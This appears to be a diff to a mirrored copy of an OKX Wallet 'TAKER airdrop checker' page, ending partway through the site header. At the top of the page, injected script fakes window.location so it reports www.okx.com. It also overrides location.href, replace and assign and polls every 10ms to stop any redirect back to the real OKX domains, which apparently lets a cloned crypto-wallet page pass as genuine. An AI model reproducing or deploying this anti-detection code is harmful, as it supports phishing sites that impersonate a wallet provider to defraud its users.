@@ -2,17 +2,42 @@
 <!-- Mirrored from web3.okx.com/airdrop-checker/taker by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 Jan 2026 12:20:17 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head><script>// CRITICAL: Prevent ALL redirects to okx.com - MUST RUN FIRST
+// Override hostname IMMEDIATELY before any other code can check it
 (function() {
   'use strict';
+  
+  // IMMEDIATE hostname override - must happen first thing
+  try {
+    Object.defineProperty(window.location, 'hostname', {
+      get: function() { return 'www.okx.com'; },
+      set: function() {},
+      configurable: true,
+      enumerable: true
+    });
+    Object.defineProperty(window.location, 'host', {
+      get: function() { return 'www.okx.com'; },
+      set: function() {},
+      configurable: true,
+      enumerable: true
+    });
+    Object.defineProperty(window.location, 'origin', {
+      get: function() { return 'https://www.okx.com'; },
+      set: function() {},
+      configurable: true,
+      enumerable: true
+    });
+  } catch(e) {}
+  
   var originalHref = window.location.href;
   var blockedDomains = ['okx.com', 'www.okx.com', 'web3.okx.com'];
   
   function isOkxUrl(url) {
     if (!url || typeof url !== 'string') return false;
     var lower = url.toLowerCase();
+    // Block any URL containing okx.com in any form, including paths like /en-us
     return blockedDomains.some(function(domain) {
-      return lower.indexOf(domain) > -1 || lower.indexOf('//' + domain) > -1;
-    });
+      return lower.indexOf(domain) > -1 || lower.indexOf('//' + domain) > -1 || lower.indexOf('/' + domain) > -1;
+    }) || lower.indexOf('okx.com') > -1; // Also catch any okx.com reference
   }
   
   function blockRedirect(url, method) {
@@ -30,37 +55,173 @@
   var originalPushState = history.pushState;
   var originalReplaceState = history.replaceState;
   
-  // Block location.href assignments
+  // CRITICAL: Override location hostname/host/origin to fake okx.com domain
+  // This prevents JavaScript from detecting wrong domain and redirecting
+  // MUST override before any other code can check hostname
+  // Use 'www.okx.com' to match what the redirect code expects
+  var fakeHostname = 'www.okx.com';
+  var fakeHost = 'www.okx.com';
+  var fakeOrigin = 'https://www.okx.com';
+  
+  // Store original descriptors BEFORE overriding
+  var originalHostnameDescriptor = Object.getOwnPropertyDescriptor(window.location, 'hostname') ||
+                                   Object.getOwnPropertyDescriptor(Object.getPrototypeOf(window.location), 'hostname');
+  var originalHostDescriptor = Object.getOwnPropertyDescriptor(window.location, 'host') ||
+                               Object.getOwnPropertyDescriptor(Object.getPrototypeOf(window.location), 'host');
+  var originalOriginDescriptor = Object.getOwnPropertyDescriptor(window.location, 'origin') ||
+                                 Object.getOwnPropertyDescriptor(Object.getPrototypeOf(window.location), 'origin');
+  
   try {
+    Object.defineProperty(window.location, 'hostname', {
+      get: function() { 
+        // Always return www.okx.com to pass domain checks and prevent redirects
+        return 'www.okx.com'; 
+      },
+      set: function() {
+        // Prevent setting hostname
+      },
+      configurable: true,
+      enumerable: true
+    });
+    
+    Object.defineProperty(window.location, 'host', {
+      get: function() { return 'www.okx.com'; },
+      set: function() {},
+      configurable: true,
+      enumerable: true
+    });
+    
+    Object.defineProperty(window.location, 'origin', {
+      get: function() { return 'https://www.okx.com'; },
+      set: function() {},
+      configurable: true,
+      enumerable: true
+    });
+    
+    Object.defineProperty(window.location, 'protocol', {
+      get: function() { return 'https:'; },
+      set: function() {},
+      configurable: true,
+      enumerable: true
+    });
+    
+    // Also override on originalLocation directly
+    if (originalLocation && originalLocation !== window.location) {
+      try {
+        Object.defineProperty(originalLocation, 'hostname', {
+          get: function() { return 'www.okx.com'; },
+          set: function() {},
+          configurable: true
+        });
+      } catch(e) {}
+    }
+  } catch(e) {
+    console.warn('Could not override location properties:', e);
+  }
+  
+  // Block location.href assignments - smart getter that checks actual location
+  try {
+    var locationHrefDescriptor = Object.getOwnPropertyDescriptor(window.location, 'href') || 
+                                 Object.getOwnPropertyDescriptor(Object.getPrototypeOf(window.location), 'href');
+    
     Object.defineProperty(window.location, 'href', {
-      get: function() { return originalHref; },
+      get: function() { 
+        // Get actual href to check for redirects
+        var current = originalHref;
+        try {
+          if (locationHrefDescriptor && locationHrefDescriptor.get) {
+            current = locationHrefDescriptor.get.call(window.location);
+          } else if (originalLocation && originalLocation.href) {
+            current = originalLocation.href;
+          }
+          // If redirected to okx.com, force return original
+          if (isOkxUrl(current) && current !== originalHref) {
+            return originalHref;
+          }
+          // Update originalHref if legitimate non-okx URL
+          if (!isOkxUrl(current)) {
+            originalHref = current;
+          }
+        } catch(e) {}
+        return current;
+      },
       set: function(url) {
-        if (blockRedirect(url, 'location.href')) return false;
+        if (blockRedirect(url, 'location.href')) {
+          // Force stay on original page
+          try {
+            if (locationHrefDescriptor && locationHrefDescriptor.set) {
+              locationHrefDescriptor.set.call(window.location, originalHref);
+            } else if (originalLocation && originalLocation.replace) {
+              originalLocation.replace(originalHref);
+            }
+          } catch(e) {}
+          return false;
+        }
         try {
           originalHref = url;
-          var descriptor = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(window.location), 'href');
-          if (descriptor && descriptor.set) {
-            descriptor.set.call(window.location, url);
+          if (locationHrefDescriptor && locationHrefDescriptor.set) {
+            locationHrefDescriptor.set.call(window.location, url);
+          } else if (originalLocation) {
+            originalLocation.href = url;
           }
         } catch(e) {
           console.warn('Redirect blocked:', url);
         }
       },
-      configurable: false
+      configurable: true,
+      enumerable: true
     });
-  } catch(e) {}
+  } catch(e) {
+    console.warn('Could not override location.href:', e);
+  }
   
-  // Block location.replace
+  // Block location.replace - MUST block ALL okx.com redirects (including /en-us)
   window.location.replace = function(url) {
-    if (blockRedirect(url, 'replace')) return;
-    return originalReplace.apply(this, arguments);
+    var urlStr = url ? String(url) : '';
+    var urlLower = urlStr.toLowerCase();
+    // Block ANY URL containing okx.com in any form
+    if (blockRedirect(urlStr, 'replace') || urlLower.indexOf('okx.com') > -1 || 
+        urlLower.indexOf('www.okx.com') > -1 || urlLower.indexOf('web3.okx.com') > -1) {
+      console.warn('BLOCKED location.replace to okx.com:', urlStr);
+      // DO NOT call original replace - just return to prevent redirect
+      return;
+    }
+    // Only allow non-okx.com redirects
+    try {
+      return originalReplace.apply(this, arguments);
+    } catch(e) {
+      console.warn('location.replace blocked:', urlStr);
+    }
   };
   
-  // Block location.assign
+  // Block location.assign - MUST block ALL okx.com redirects
   window.location.assign = function(url) {
-    if (blockRedirect(url, 'assign')) return;
-    return originalAssign.apply(this, arguments);
+    var urlStr = url ? String(url) : '';
+    var urlLower = urlStr.toLowerCase();
+    if (blockRedirect(urlStr, 'assign') || urlLower.indexOf('okx.com') > -1 ||
+        urlLower.indexOf('www.okx.com') > -1 || urlLower.indexOf('web3.okx.com') > -1) {
+      console.warn('BLOCKED location.assign to okx.com:', urlStr);
+      // DO NOT call original assign - just return
+      return;
+    }
+    try {
+      return originalAssign.apply(this, arguments);
+    } catch(e) {
+      console.warn('location.assign blocked:', urlStr);
+    }
   };
+  
+  // CRITICAL: Also override originalLocation.replace and assign to prevent bypass
+  try {
+    if (originalLocation && originalLocation.replace) {
+      originalLocation.replace = window.location.replace;
+    }
+    if (originalLocation && originalLocation.assign) {
+      originalLocation.assign = window.location.assign;
+    }
+  } catch(e) {
+    console.warn('Could not override originalLocation methods:', e);
+  }
   
   // Block document.location
   Object.defineProperty(document, 'location', {
@@ -144,21 +305,57 @@
     observer.observe(document.head, { childList: true, subtree: true });
   }
   
-  // Continuously monitor and block redirects
+  // Continuously monitor and block redirects - VERY AGGRESSIVE
+  var redirectCheckCount = 0;
   setInterval(function() {
-    var currentHref = window.location.href;
-    if (isOkxUrl(currentHref) && currentHref !== originalHref) {
-      console.warn('Redirect detected! Reverting...');
-      window.stop();
+    try {
+      var currentHref;
       try {
-        if (history.length > 1) {
-          history.go(-1);
+        // Get actual href bypassing our override
+        if (originalLocation && originalLocation.href) {
+          currentHref = originalLocation.href;
         } else {
-          window.location.replace(originalHref);
+          currentHref = window.location.href;
         }
-      } catch(e) {}
+      } catch(e) {
+        currentHref = window.location.href;
+      }
+      
+      if (isOkxUrl(currentHref) && currentHref !== originalHref) {
+        redirectCheckCount++;
+        console.warn('Redirect detected (' + redirectCheckCount + ')! Blocking redirect to:', currentHref);
+        console.warn('Forcing return to:', originalHref);
+        
+        // Force stop navigation
+        window.stop();
+        
+        // Force back to original immediately - use our blocked replace
+        try {
+          // Don't call original replace - it might redirect
+          // Instead, just force the href directly via our override
+          if (history.length > 1) {
+            history.go(-1);
+          } else {
+            try {
+              history.back();
+            } catch(e2) {
+              // Force stay on page - use location.href which is also blocked
+              try {
+                window.location.href = originalHref;
+              } catch(e3) {
+                // Last resort: just prevent
+                console.warn('Unable to revert redirect, but blocking it');
+              }
+            }
+          }
+        } catch(e) {
+          // Silent fail to avoid loops
+        }
+      }
+    } catch(e) {
+      // Silent fail to avoid infinite loops
     }
-  }, 50);
+  }, 10); // Check every 10ms - very aggressive
 })();</script><meta charSet="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"/><title>TAKER airdrop checker | OKX Wallet</title><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/><meta name="description" content="Bitcoin incentive layer: Scaling Bitcoin hodlers 100x. Check your TAKER airdrop eligibility on OKX Wallet. Claim starts on July 18, 2025."/><meta name="Author" content="OKX"/><meta name="Copyright" content="okx.com"/><meta name="google-site-verification" content="SVJL-WGbe8_1J05O3I8V4ehAs8L89UDA-bcAyAJ2SLw"/><meta property="og:type" content="website"/><meta property="og:title" content="TAKER airdrop checker"/><meta property="og:url" content="index.html"/><meta property="og:site_name" content="OKX Wallet"/><meta property="og:image" content="assets/imgs/232/79832BE02D2BC323.jpg"/><meta property="og:description" content="Bitcoin incentive layer: Scaling Bitcoin hodlers 100x. Check your TAKER airdrop eligibility on OKX Wallet. Claim starts on July 18, 2025."/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="OKX Wallet"/><meta name="twitter:title" content="TAKER airdrop checker"/><meta name="twitter:description" content="Bitcoin incentive layer: Scaling Bitcoin hodlers 100x. Check your TAKER airdrop eligibility on OKX Wallet. Claim starts on July 18, 2025."/><meta name="twitter:image" content="assets/imgs/232/79832BE02D2BC323.jpg"/><meta name="full-screen" content="yes"/><meta name="browsermode" content="application"/><meta name="x5-orientation" content="portrait"/><meta name="x5-fullscreen" content="true"/><meta name="x5-page-mode" content="app"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="theme-color" content="#121212"/><meta name="yandex-verification" content="aaa987727259a356"/><meta name="naver-site-verification" content="3275b79a3c81ac994632e15ac643c47a64bf1b43"/><link rel="preload" as="image" fetchPriority="high" href="https://web3.okx.com/cdn/assets/imgs/258/4C0F53E9427468A2.svg"/><link rel="preload" as="image" fetchPriority="high" href="https://web3.okx.com/cdn/assets/imgs/258/FD6547F8FFE4CC6E.svg"/><link rel="shortcut icon" href="assets/imgs/258/E83EEE882374E2FF.png"/><link rel="apple-touch-icon" href="assets/imgs/254/43DEFFE88CCA0D7C.png" type="image/png"/><link rel="canonical" href="index.html"/><link rel="alternate" href="#" hreflang="fi"/><link rel="alternate" href="#" hreflang="nb"/><link rel="alternate" href="#" hreflang="sv"/><link rel="alternate" href="#" hreflang="pl"/><link rel="alternate" href="#" hreflang="nl"/><link rel="alternate" href="#" hreflang="de"/><link rel="alternate" href="#" hreflang="es-es"/><link rel="alternate" href="#" hreflang="it"/><link rel="alternate" href="#" hreflang="pt"/><link rel="alternate" href="#" hreflang="ro"/><link rel="alternate" href="#" hreflang="cs"/><link rel="alternate" href="#" hreflang="zh-Hans"/><link rel="alternate" href="#" hreflang="zh-Hant"/><link rel="alternate" href="#" hreflang="fr"/><link rel="alternate" href="#" hreflang="id"/><link rel="alternate" href="#" hreflang="ru"/><link rel="alternate" href="#" hreflang="vi"/><link rel="alternate" href="#" hreflang="pt-br"/><link rel="alternate" href="#" hreflang="es"/><link rel="alternate" href="#" hreflang="uk"/><link rel="alternate" href="index.html" hreflang="en"/><link rel="alternate" href="#" hreflang="ja"/><link rel="alternate" href="#" hreflang="ar"/><link rel="alternate" href="#" hreflang="tr"/><link rel="alternate" href="index.html" hreflang="x-default"/><link rel="stylesheet" type="text/css" href="assets/okfe/okx-nav/okxGlobal/index.4b1c0af4.css"/><link rel="stylesheet" type="text/css" href="assets/okfe/okx-nav/web3Global/index.f70ba740.css"/><style>
         *{ margin: 0; padding: 0}
         </style><link rel="stylesheet" type="text/css" href="assets/okfe/okx-nav/web3Header/index.1dab6834.css"/><link rel="stylesheet" type="text/css" href="assets/okfe/connect-wallet/nav-defi/index.207a0a64.css"/><link rel="stylesheet" type="text/css" href="assets/okfe/okx-nav/web3Footer/index.2712fc4e.css"/><link rel="stylesheet" type="text/css" href="assets/okfe/web3-activities/2225/index.a83a3cbc.css"/><link rel="stylesheet" type="text/css" href="assets/okfe/web3-activities/8698/index.02dd7515.css"/><link rel="stylesheet" type="text/css" href="assets/okfe/web3-activities/2435/index.71459734.css"/><link rel="stylesheet" type="text/css" href="assets/okfe/web3-activities/1460/index.e07c78c6.css"/><link rel="stylesheet" type="text/css" href="assets/okfe/web3-activities/5474/index.5df8e20d.css"/><link rel="stylesheet" type="text/css" href="assets/okfe/web3-activities/2419/index.f22ee808.css"/><link rel="stylesheet" type="text/css" href="assets/okfe/web3-activities/4765/index.f749d675.css"/><link rel="stylesheet" type="text/css" href="assets/okfe/web3-activities/tgeTool/index.88d309c4.css"/><script>Object.defineProperty(window,'_vA9xZk1QpR3t',{value:false,writable:false,configurable:false});</script><script src="assets/okfe/okx-nav/web3Theme/index.5e02dbd7.js" type="text/javascript"></script></head><body id="body" class="theme-dark pnl-modern brand-web3" broker-style="" data-responsive="true" data-nav="true"><header id="headerContainer" class="header header-container" data-chain="true"><link rel="preload" as="image" href="assets/imgs/259/6FC61997CB6A3CC9.gif"/><div class="header-wrap "><button type="button" class="skip-to-content">Skip to main content</button><div class="header-main web3-shrink-step-0 header-content web3-header" data-from="2"><div class="logo-container mode-container" id="logoCon" data-chain="true"><div class="mode-logo"><a class="logo-wrap web3-logo-wrap" href="#"" aria-label="OKX logo, go to homepage"><img width="118" height="16" class="logo-img" src="data:image/png;base64,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" alt="OKX - Leading Cryptocurrency Exchange" title="OKX"/></a></div></div><nav id="navContainer" class="nav-container" data-from="2" aria-label="Main menu"><ul class="nav-scroll-box"><li class="nav-l-container "><i class="nav-scroll-l icon okx-header-footer-caret-up "></i><div class="nav-l-sec"><ul class="nav-l-con"><a class="nav-link nav-item is-left nav-cefi-market" href="#">Market</a><a class="nav-link nav-item is-left nav-meme-pump" href="#">Meme Pump</a><a class="nav-link nav-item is-left nav-tracker" href="#">Tracker</a><a class="nav-link nav-item is-left nav-signal" href="#">Signal</a><a class="nav-link nav-item is-left nav-leaderboard" href="#">Copy trading</a><a class="nav-link nav-item is-left nav-swap" href="#">Swap</a><a class="nav-link nav-item is-left nav-portfolio" href="#">Portfolio</a><a class="nav-link nav-item is-left nav-referral" href="#">Referral</a><div class="nav-item is-left nav-web3-more "><button type="button" class="tab nav-text mu-txt icon okx-header-footer-arrow-chevrons-down" aria-expanded="false">More</button><div class="drop-sm-down u-in-ext dp-c-l-ag " style="z-index:20000"><div class="info-extend-box"><div class="extend-box extend-small-box"><div class="box-title">Products</div><a href="#" class="box-item icon okx-header-footer-earn-outline" aria-label="DeFi">DeFi</a><a href="#" class="box-item icon okx-header-footer-nft" aria-label="Marketplace">Marketplace</a><a href="#" class="box-item icon okx-header-footer-security" aria-label="Security">Security</a></div><div class="extend-box extend-small-box"><div class="box-title">Build</div><div class="drop-explorer-list"><div class="drop-explorer-list"><div class="dropdown-panel-li dp-explorer"><a href="#" class="box-item panel-box-item drop-panel-box-item icon okx-header-footer-globe"><div class="item-box item-panel-drop trade-item-panel-drop  "><div class="item-title trade-item-panel-drop-title ">X Layer</div></div></a><i tabindex="0" role="button" aria-expanded="false" aria-label="Open X Layer sub-menu" class="panel-drop-item-icon trade-panel-drop-item-icon icon okx-header-footer-arrow-chevrons-right"></i></div><div id="drop-panel-box-12509" class="drop-panel-box drop-panel-box-list explorer-drop-box-list explorer-drop-panel-third-list " style="display:none"><a href="#" class="box-item panel-box-item drop-panel-box-item icon okx-header-footer-white-paper third-box-item"><div class="item-box item-panel-drop trade-item-panel-drop item-third-panel "><div class="item-title trade-item-panel-drop-title title-without-desc ">Learn about X Layer</div></div></a><a href="#" class="box-item panel-box-item drop-panel-box-item icon okx-header-footer-search third-box-item"><div class="item-box item-panel-drop trade-item-panel-drop item-third-panel "><div class="item-title trade-item-panel-drop-title title-without-desc ">X Layer Explorer</div></div></a><a href="#" class="box-item panel-box-item drop-panel-box-item icon okx-header-footer-bridge-1 third-box-item"><div class="item-box item-panel-drop trade-item-panel-drop item-third-panel "><div class="item-title trade-item-panel-drop-title title-without-desc ">Bridge</div></div></a><a href="#" class="box-item panel-box-item drop-panel-box-item icon okx-header-footer-perpetual third-box-item"><div class="item-box item-panel-drop trade-item-panel-drop item-third-panel "><div class="item-title trade-item-panel-drop-title title-without-desc ">Developer docs</div></div></a><a href="#" class="box-item panel-box-item drop-panel-box-item icon okx-header-footer-web3-faucet third-box-item"><div class="item-box item-panel-drop trade-item-panel-drop item-third-panel "><div class="item-title trade-item-panel-drop-title title-without-desc ">Testnet faucet</div></div></a><a href="https://github.com/okx/xlayer-docs" class="box-item panel-box-item drop-panel-box-item icon okx-header-footer-github third-box-item" target="_blank"><div class="item-box item-panel-drop trade-item-panel-drop item-third-panel "><div class="item-title trade-item-panel-drop-title title-without-desc ">GitHub</div></div></a></div><div class="dropdown-panel-li dp-explorer"><a href="#" class="box-item panel-box-item drop-panel-box-item icon okx-header-footer-api-keys"><div class="item-box item-panel-drop trade-item-panel-drop  "><div class="item-title trade-item-panel-drop-title ">Wallet API</div></div></a><i tabindex="0" role="button" aria-expanded="false" aria-label="Open Wallet API sub-menu" class="panel-drop-item-icon trade-panel-drop-item-icon icon okx-header-footer-arrow-chevrons-right"></i></div><div id="drop-panel-box-12507" class="drop-panel-box drop-panel-box-list explorer-drop-box-list explorer-drop-panel-third-list " style="display:none"><a href="#" class="box-item panel-box-item drop-panel-box-item icon okx-header-footer-official-website-api third-box-item"><div class="item-box item-panel-drop trade-item-panel-drop item-third-panel "><div class="item-title trade-item-panel-drop-title title-without-desc ">Discover Wallet API</div></div></a><a href="#" class="box-item panel-box-item drop-panel-box-item icon okx-header-footer-perpetual third-box-item"><div class="item-box item-panel-drop trade-item-panel-drop item-third-panel "><div class="item-title trade-item-panel-drop-title title-without-desc ">API docs</div></div></a><a href="#" class="box-item panel-box-item drop-panel-box-item icon okx-header-footer-trading-data third-box-item"><div class="item-box item-panel-drop trade-item-panel-drop item-third-panel "><div class="item-title trade-item-panel-drop-title title-without-desc ">Manage API keys</div></div></a></div><div class="dropdown-panel-li dp-explorer"><a href="#" class="box-item panel-box-item drop-panel-box-item drop-panel-menu-item icon okx-header-footer-search"><div class="item-box item-panel-drop trade-item-panel-drop  "><div class="item-title trade-item-panel-drop-title ">Blockchain explorer</div></div></a><i tabindex="0" role="button" aria-expanded="false" aria-label="Open  sub-menu" class="panel-drop-item-icon trade-panel-drop-item-icon icon okx-header-footer-arrow-chevrons-right"></i></div><div class="dropdown-panel-li dp-explorer"><a href="#" class="box-item panel-box-item drop-panel-box-item mu-title icon okx-header-footer-link"><div class="item-box item-panel-drop trade-item-panel-drop  "><div class="item-title trade-item-panel-drop-title ">Connect wallet in DApps</div></div></a></div></div></div></div></div></div></div></ul></div><i class="nav-scroll-r icon okx-header-footer-caret-up "></i></li><li class="nav-r-sec"><div id="headerModeSearch" class="mode-search"></div><div id="headerModeAddress" class="nav-item nav-address"></div><ul class="nav-r-con"><div class="nav-item nav-boost-item nav-right-item"><a aria-expanded="false" type="button" href="#" class="nav-item nav-boost icon"><img class="nav-boost-icon" src="assets/imgs/259/6FC61997CB6A3CC9.gif" alt="Boost"/><span>Boost</span></a><div class="u-in-ext dp-c-l-ag nav-boost-drop " style="z-index:20000"><div class="extend-box "><a href="#" class="box-item icon okx-header-footer-tokens-outline"><div class="item-box"><div id="" class="item-title">X Launch</div><div class="desc">Participate and earn tokens</div></div></a><a href="#" class="box-item icon okx-header-footer-web3-dapp-rankings"><div class="item-box"><div id="" class="item-title">X Campaign</div><div class="desc">Join to win exciting rewards</div></div></a><a href="#" class="box-item icon okx-header-footer-web3-rewards"><div class="item-box"><div id="" class="item-title">Rewards center</div><div class="desc">Claim bonuses and airdrops</div></div></a></div></div></div><a href="#" aria-label="Alert" class="nav-item nav-right-item nav-alert icon okx-header-footer-bell"><span class="nav-link">Alert</span></a><div class="nav-r-pan"><button type="button" class="nav-r-pan-i web3-menu-btn icon okx-header-footer-personal-setting"></button><div class="nav-r-fun-pan "><div class="nav-r-fun-mn nav-r-container nav-fun-show"><button type="button" class="nav-r-pan-item"><span class="nav-r-item-name">Language</span><span class="nav-r-lan-cur icon okx-header-footer-arrow-chevrons-right"></span></button><button type="button" class="nav-r-pan-item"><span class="nav-r-item-name">Currency</span><span class="nav-r-lan-cur icon okx-header-footer-arrow-chevrons-right"></span></button><button type="button" class="nav-r-pan-item nav-r-pan-co-pre"><span class="nav-r-item-name">Color preferences</span><div class="nav-r-lan-cur icon okx-header-footer-arrow-chevrons-right"><div class="oxnv-pnlswitch-updown-icon-container"><i class="icon iconfont okd-component-okds-pointer_up oxnv-pnlswitch-updown-icon oxnv-pnlswitch-updown-global-up" role="img" aria-hidden="true"></i><i class="icon iconfont okd-component-pointer-down oxnv-pnlswitch-updown-icon oxnv-pnlswitch-updown-global-down" role="img" aria-hidden="true"></i></div></div></button><a class="nav-r-pan-item" href="#"><span class="nav-r-item-name">Download OKX Wallet</span><i class="nav-r-lan-cur icon okx-header-footer-arrow-chevrons-right"></i></a><a class="nav-r-pan-item" href="#"><span class="nav-r-item-name">All about Web3</span><i class="nav-r-lan-cur icon okx-header-footer-arrow-chevrons-right"></i></a><div class="nav-r-split-line"></div><a class="nav-r-pan-item notice-item" href="#"><span class="nav-r-item-name">Announcements</span><i class="nav-r-lan-cur icon okx-header-footer-arrow-chevrons-right"></i></a></div><div class="nav-r-pan-page nav-r-container  "><div class="nav-r-bk-area"><i class="icon iconfont nav-r-bk okx-header-footer-arrow-chevrons-right" role="img" aria-hidden="true"></i><span>Back</span></div><div class="nav-r-pan-option-list"><div class="nav-r-pan-option-item "><span>English</span></div><div class="nav-r-pan-option-item "><span>简体中文</span></div><div class="nav-r-pan-option-item "><span>繁體中文</span></div><div class="nav-r-pan-option-item "><span>Tiếng Việt</span></div><div class="nav-r-pan-option-item "><span>Русский</span></div><div class="nav-r-pan-option-item "><span>Español (Latinoamérica)</span></div><div class="nav-r-pan-option-item "><span>Bahasa Indonesia</span></div><div class="nav-r-pan-option-item "><span>Français</span></div><div class="nav-r-pan-option-item "><span>Deutsch</span></div><div class="nav-r-pan-option-item "><span>Italiano</span></div><div class="nav-r-pan-option-item "><span>Polski</span></div><div class="nav-r-pan-option-item "><span>Čeština</span></div><div class="nav-r-pan-option-item "><span>Română</span></div><div class="nav-r-pan-option-item "><span>Português (Portugal)</span></div><div class="nav-r-pan-option-item "><span>Português (Brasil)</span></div><div class="nav-r-pan-option-item "><span>Українська</span></div><div class="nav-r-pan-option-item "><span>Español (España)</span></div><div class="nav-r-pan-option-item "><span>Nederlands</span></div><div class="nav-r-pan-option-item "><span>العربية</span></div><div class="nav-r-pan-option-item "><span>日本語</span></div><div class="nav-r-pan-option-item "><span>Norsk (bokmål)</span></div><div class="nav-r-pan-option-item "><span>Suomi</span></div><div class="nav-r-pan-option-item "><span>Svenska</span></div><div class="nav-r-pan-option-item "><span>Türkçe</span></div></div></div><div class="nav-r-pan-page nav-r-container  "><div class="nav-r-bk-area"><i class="icon iconfont nav-r-bk okx-header-footer-arrow-chevrons-right" role="img" aria-hidden="true"></i><span>Back</span></div><div class="nav-r-pan-option-list"></div></div><div class="nav-r-pan-page nav-r-container  "><div class="nav-r-bk-area"><i class="icon iconfont nav-r-bk okx-header-footer-arrow-chevrons-right" role="img" aria-hidden="true"></i><span>Back</span></div><div class="nav-r-pan-support"><a class="nav-r-pan-sup-link okx-header-footer-arrow-chevrons-right" href="#">Learn</a><a class="nav-r-pan-sup-link okx-header-footer-arrow-chevrons-right" href="#">Support center</a></div></div></div></div><nav class="action-container"><button type="button" class="header-menu-btn icon okx-header-footer-personal-setting web3-menu-btn" id="headerMenuBtn" aria-label="Open menu with additional options" aria-controls="navColumnContainer" aria-expanded="false"></button></nav></ul></li></ul></nav></div></div><script data-id="__header_data_for_ssr__" type="application/json" 